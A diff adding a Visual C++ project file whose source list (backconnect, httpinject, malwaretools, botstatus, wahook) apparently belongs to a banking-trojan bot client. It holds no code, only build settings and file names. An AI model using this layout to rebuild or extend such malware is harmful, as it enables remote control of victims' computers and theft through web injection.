@@ -1,0 +1,126 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{192C7394-27E2-4277-A11B-ED588E1BA0D1}</ProjectGuid>
+    <RootNamespace>client</RootNamespace>
+    <Keyword>Win32Proj</Keyword>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Utility</ConfigurationType>
+    <CharacterSet>Unicode</CharacterSet>
+    <WholeProgramOptimization>false</WholeProgramOptimization>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup>
+    <_ProjectFileVersion>10.0.30319.1</_ProjectFileVersion>
+    <OutDir Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">$(SolutionDir)$(Configuration)\</OutDir>
+    <IntDir Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">$(Configuration)\</IntDir>
+    <ExtensionsToDeleteOnClean Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" />
+    <PreBuildEventUseInBuild Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</PreBuildEventUseInBuild>
+    <PostBuildEventUseInBuild Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</PostBuildEventUseInBuild>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <BuildLog>
+      <Path>
+      </Path>
+    </BuildLog>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <None Include="defines.php" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="backconnect.cpp" />
+    <ClCompile Include="baseoverlay.cpp" />
+    <ClCompile Include="binstorage.cpp" />
+    <ClCompile Include="comlibrary.cpp" />
+    <ClCompile Include="config0.cpp" />
+    <ClCompile Include="config1.cpp" />
+    <ClCompile Include="console.cpp" />
+    <ClCompile Include="crypt.cpp" />
+    <ClCompile Include="cui.cpp" />
+    <ClCompile Include="debug.cpp" />
+    <ClCompile Include="disasm.cpp" />
+    <ClCompile Include="fs.cpp" />
+    <ClCompile Include="gdi.cpp" />
+    <ClCompile Include="gui.cpp" />
+    <ClCompile Include="httpinject.cpp" />
+    <ClCompile Include="httptools.cpp" />
+    <ClCompile Include="malwaretools.cpp" />
+    <ClCompile Include="math.cpp" />
+    <ClCompile Include="mem.cpp" />
+    <ClCompile Include="mscab.cpp" />
+    <ClCompile Include="peimage.cpp" />
+    <ClCompile Include="process.cpp" />
+    <ClCompile Include="registry.cpp" />
+    <ClCompile Include="sslsocket.cpp" />
+    <ClCompile Include="str.cpp" />
+    <ClCompile Include="sync.cpp" />
+    <ClCompile Include="threadsgroup.cpp" />
+    <ClCompile Include="time.cpp" />
+    <ClCompile Include="ucl.cpp" />
+    <ClCompile Include="wahook.cpp" />
+    <ClCompile Include="wininet.cpp" />
+    <ClCompile Include="winsecurity.cpp" />
+    <ClCompile Include="wsocket.cpp" />
+    <ClCompile Include="xmlparser.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="backconnect.h" />
+    <ClInclude Include="baseoverlay.h" />
+    <ClInclude Include="binstorage.h" />
+    <ClInclude Include="botstatus.h" />
+    <ClInclude Include="comlibrary.h" />
+    <ClInclude Include="config0.h" />
+    <ClInclude Include="config1.h" />
+    <ClInclude Include="console.h" />
+    <ClInclude Include="crypt.h" />
+    <ClInclude Include="cui.h" />
+    <ClInclude Include="cui[en].h" />
+    <ClInclude Include="debug.h" />
+    <ClInclude Include="defines.h" />
+    <ClInclude Include="disasm.h" />
+    <ClInclude Include="fs.h" />
+    <ClInclude Include="gdi.h" />
+    <ClInclude Include="gui.h" />
+    <ClInclude Include="httpinject.h" />
+    <ClInclude Include="httptools.h" />
+    <ClInclude Include="malwaretools.h" />
+    <ClInclude Include="math.h" />
+    <ClInclude Include="mem.h" />
+    <ClInclude Include="mscab.h" />
+    <ClInclude Include="ntdll.h" />
+    <ClInclude Include="peimage.h" />
+    <ClInclude Include="process.h" />
+    <ClInclude Include="registry.h" />
+    <ClInclude Include="sslsocket.h" />
+    <ClInclude Include="str.h" />
+    <ClInclude Include="sync.h" />
+    <ClInclude Include="threadsgroup.h" />
+    <ClInclude Include="time.h" />
+    <ClInclude Include="ucl.h" />
+    <ClInclude Include="wahook.h" />
+    <ClInclude Include="wininet.h" />
+    <ClInclude Include="winsecurity.h" />
+    <ClInclude Include="wsocket.h" />
+    <ClInclude Include="xmlparser.h" />
+    <ClInclude Include="config.h" />
+    <ClInclude Include="generateddata.h" />
+    <ClInclude Include="languages\cui_en.h" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
